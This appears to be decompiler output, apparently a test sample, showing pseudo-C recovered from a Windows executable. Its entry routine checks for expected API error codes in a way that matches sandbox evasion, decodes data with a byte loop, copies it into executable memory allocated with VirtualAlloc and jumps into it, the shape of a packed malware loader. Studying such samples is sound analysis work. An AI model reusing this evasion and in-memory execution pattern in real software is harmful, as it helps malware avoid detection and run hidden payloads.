// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0043F000: void fn0043F000(Register (ptr (arr Eq_15)) ebx, Stack Eq_3 dwArg04, Stack (ptr (arr Eq_15)) dwArg08, Stack Eq_5 dwArg0C, Stack (ptr (arr Eq_23)) dwArg10)
void fn0043F000(Eq_15 * ebx[], Eq_3 dwArg04, Eq_15 * dwArg08[], Eq_5 dwArg0C, Eq_23 * dwArg10[])
{
	Eq_7 dwLoc08_111 = ebx & 0x00;
	Eq_5 dwLoc0C_109 = 0x00;
	while (dwLoc0C_109 < dwArg0C)
	{
		byte cl_83 = (byte) (((Mem0[dwArg08 + dwLoc0C_109:word32] ^ 0x00) & ~0x00 & 0xFF) + ((Mem0[dwArg10 + dwLoc08_111:word32] & 0xFF ^ ~0x00) + 0x01));
		word32 eax_86 = dwArg04 + dwLoc0C_109;
		*eax_86 = 0x00;
		*eax_86 = *eax_86 - cl_83;
		*eax_86 = -*eax_86;
		Eq_7 edi_93 = (word32) dwLoc08_111 + 0x01;
		dwLoc08_111 = edi_93;
		if (edi_93 == 0x01)
			dwLoc08_111 = edi_93 & 0x00;
		if (dwLoc08_111 > 0xD6000000)
			return;
		dwLoc0C_109 = dwLoc0C_109 - ~0x00;
	}
}

// 0043F092: Register Eq_63 Win32CrtStartup()
Eq_63 Win32CrtStartup()
{
	Eq_63 eax_101 = WSAStartup(0x0000, fp - 488);
	if (0x00 != 0x00)
	{
		Eq_80 eax_139 = CoCreateInstanceEx(fp - 0x04, null, 0x00, null, 0x00, null);
		eax_101 = eax_139 - 0x800401F0;
		if (eax_139 == 0x800401F0)
		{
			Eq_80 eax_155 = WriteFmtUserTypeStg(null, 0x0000, null);
			eax_101 = eax_155 - 0x80070057;
			if (eax_155 == 0x80070057)
			{
				fn0043F000(fp - 0x019C, fp - 0x01AC, 0x00401000 - (ecx & 0x00), dwLoc08 & eax_155 - 0x80070057 ^ 0x38, globals->a43F212);
				struct Eq_133 * dwLoc20_177 = fp - 0x019C;
				Eq_135 eax_212 = VirtualAlloc(0x00, dwLoc01A8 + dwLoc01AC, 0x3000, 0x40);
				Eq_149 dwLoc1C_216 = dwLoc1C & 0x00;
				uint32 dwLoc01B0_219 = dwLoc01B0 & 0x00;
				while (dwLoc01B0_219 < dwLoc01A4)
				{
					Eq_15 (* ebx_248)[] = dwLoc20_177->dw0000 + 0x00400000;
					fn0043F000(ebx_248, eax_212 + dwLoc1C_216, ebx_248, Mem0[dwLoc20_177 + 0x04:word32], 4452882);
					dwLoc1C_216 = dwLoc1C_216 + Mem0[dwLoc20_177 + 0x04:word32];
					dwLoc01B0_219 = dwLoc01B0_219 + 0x01;
					dwLoc20_177 = dwLoc20_177 + 0x01;
				}
				word32 esp_287;
				word32 ebp_288;
				byte SCZO_289;
				word32 edi_290;
				word32 esi_291;
				byte SZO_292;
				byte C_293;
				word32 ebx_294;
				Eq_63 eax_295;
				byte Z_296;
				word32 ecx_297;
				word32 edx_298;
				(*((word32) eax_212 + 5776))();
				return eax_295;
			}
		}
	}
	int3();
	return eax_101;
}

